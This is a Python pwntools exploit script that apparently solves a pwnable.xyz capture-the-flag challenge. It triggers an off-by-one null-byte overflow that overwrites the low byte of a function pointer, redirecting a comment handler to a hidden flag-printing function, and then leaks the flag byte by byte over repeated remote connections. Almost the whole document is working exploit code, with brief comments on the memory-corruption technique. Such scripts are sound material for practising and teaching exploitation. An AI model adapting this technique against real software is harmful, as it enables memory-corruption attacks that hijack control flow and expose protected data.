from pwn import *

#context.log_level = 'debug'
e = ELF('./challenge')
#p = process('./challenge')
#p = remote('svc.pwnable.xyz',30006)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

def generate(size):
	sla('>','1')
	sla(':',str(size))

def loadflag():
	sla('>','2')

def printflag(chk): # if 'y' -> f_do_comment(); function pointer
	sla('>','3')
	sla('?',chk);
	#,comment
	#if chk == 'y':
	#	sa(':',comment)
	#else:
	#	return

flag = 'F'
for i in range(1,0x31):
	p = remote('svc.pwnable.xyz',30006)
	printflag('y') # setting function pointer
	generate(i) # strcpy(key, s); -> \x00
	loadflag()
	generate(64) # off-by-one -> null byte overflow = 0xB1F -> 0xB00
	printflag('n') # return do_comment() -> real_print_flag()
	p.recv()
	flag += p.recv(0x31)[i]
	#flag+=p.recvline()[i+1]
	log.info(str(i)+' : '+flag)
	p.close()

# real_print_flag -> 0xB00
# f_do_comment -> 0xB1F
# key ~ do_commnet -> 64

p.interactive()